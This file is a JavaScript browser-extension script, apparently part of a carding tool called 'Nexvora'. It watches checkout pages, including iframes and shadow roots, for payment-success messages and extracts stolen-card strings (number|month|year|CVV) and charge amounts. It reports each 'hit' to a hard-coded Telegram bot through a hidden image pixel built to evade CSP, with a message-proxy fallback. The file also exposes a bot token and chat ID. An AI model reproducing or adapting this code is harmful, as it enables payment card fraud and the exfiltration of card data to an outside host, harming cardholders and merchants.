/**
 * Nexvora Dual-Transmission Omni-Detection (v15.0 - Absolute Failsafe)
 */
(function() {
    let hasSentDirectly = false;
    const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const CHAT_ID = '-1003721268860';

    const sendDirectTelegram = async (message) => {
        if (hasSentDirectly) return;
        hasSentDirectly = true;
        
        try {
            // Absolute Failsafe 1: Image Pixel (Bypasses Service Worker completely)
            try {
                const pixelUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
                const p = document.createElement('img');
                p.style.display = 'none';
                p.src = pixelUrl;
                document.body.appendChild(p);
            } catch(ign) {}

            // Failsafe 2: Message Proxy (Bypasses local CSP)
            chrome.runtime.sendMessage({
                type: 'NOTIFY_HIT',
                data: { text: message }
            });
            console.log("[Nexvora] Dual transmission fired.");
        } catch (e) {
            console.error("[Nexvora] Dual transmission failed.", e);
        }
    };

    const processHit = (text, element) => {
        if (hasSentDirectly) return;
        if (!text) return;
        
        // Exact matches with complete whitespace immunity
        const cleanText = text.toLowerCase().replace(/[^a-z0-9]/g, '');
        const isHit = (
            cleanText.includes('paidsuccessfully') || 
            cleanText.includes('successfullyhitted') || 
            cleanText.includes('paymentsuccessful') ||
            cleanText.includes('paymentconfirmed') ||
            cleanText.includes('approved')
        );

        if (isHit && cleanText.length > 5 && cleanText.length < 1500) {
            hasSentDirectly = true; // fast lock

            let amountStr = 'N/A';
            let cardStr = 'N/A';

            try {
                const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
                if (cardMatch) cardStr = cardMatch[0];

                const amountRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
                const docText = document.body ? document.body.innerText : '';
                const matchArr = text.match(amountRegex) || docText.match(amountRegex);
                
                if (matchArr && matchArr.length > 0) {
                    amountStr = matchArr[0].toString().trim();
                }
            } catch (e) {}

            const message = `<b>HIT BDT (PROXY)</b>\n` +
                            `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                            `👤 <b>User:</b> 🇧🇩\n` +
                            `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                            `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
                            `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                            `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
                            `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
                            `<i>Checked by @hitinfobdrobot ✅</i>`;

            sendDirectTelegram(message);
        }
    };

    const aggressivelyScan = (root) => {
        if (hasSentDirectly) return;
        if (!root) return;

        const elements = root.querySelectorAll ? root.querySelectorAll('div, span, p, h1, h2, h3, h4, h5, h6, strong, b, label') : [];
        for (let i = 0; i < elements.length; i++) {
            if (hasSentDirectly) break;
            const el = elements[i];
            const text = el.innerText || el.textContent;
            if (text) processHit(text, el);
        }

        if (root.shadowRoot) aggressivelyScan(root.shadowRoot);
        const iframes = root.querySelectorAll ? root.querySelectorAll('iframe') : [];
        for (let i = 0; i < iframes.length; i++) {
            try {
                const doc = iframes[i].contentDocument;
                if (doc && doc.body) aggressivelyScan(doc.body);
            } catch (e) {} 
        }
    };

    const observer = new MutationObserver((mutations) => {
        if (hasSentDirectly) {
            observer.disconnect();
            return;
        }
        for (let m of mutations) {
            for (let node of m.addedNodes) {
                if (node.nodeType === 1) { 
                    const text = node.innerText || node.textContent;
                    if (text) processHit(text, node);
                    if (node.shadowRoot) aggressivelyScan(node.shadowRoot);
                }
            }
        }
    });

    if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
        setInterval(() => aggressivelyScan(document.body), 400);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            observer.observe(document.body, { childList: true, subtree: true });
            setInterval(() => aggressivelyScan(document.body), 400);
        });
    }

})();
